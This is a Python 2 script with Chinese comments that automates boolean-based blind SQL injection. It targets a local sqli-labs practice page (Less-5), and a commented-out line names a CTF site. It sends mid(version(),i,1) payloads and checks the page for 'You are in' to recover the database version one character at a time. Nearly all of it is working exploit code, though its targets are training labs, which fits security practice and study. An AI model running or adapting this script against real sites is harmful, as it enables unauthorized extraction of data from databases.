# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
import time
import string
import time
#脚本应用于get请求单框注入情况下
#定义一个url
#url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
url='http://localhost/sqli-labs/Less-5/?id=' #简单sql注入2
#定义语法关键字测试使用的载荷库
f = file("result.txt", "w+")
# 定义攻击载荷
keyword='You are in'
payload2="'%20--+" #终止SQL语句注释符号
versionlen=0
stop=False
wList = ['0','1','2','3','4','5','6','7','8','9','.','-']
#需要注意的是如果wList中的数字不是字符型变量，会导致'.'等符号被误MySQL数据库认为0的情况发生
for word in string.lowercase:
    wList.append(word)
print wList
for i in range(1,16):
    payload1_version = "1%27%20and%20mid(version(),"+str(i)+",1)='"  # 查看length（version）函数判断版本名长度
    for word in wList:
        try:
            payload = payload1_version + word + payload2
            print url + payload
            req = urllib2.Request(url + payload)
            # print 'req is already: ' + url + quote("1' " + line + " '1'='1")
            res = urllib2.urlopen(req, data=None, timeout=1)
            # print 'res is already '
            text = res.read()
            if (text.find(keyword) > -1):
                print '第'+str(i)+'个字符是：', word
                f.writelines(word)
                break
        except Exception, e:
            print e
f.close()
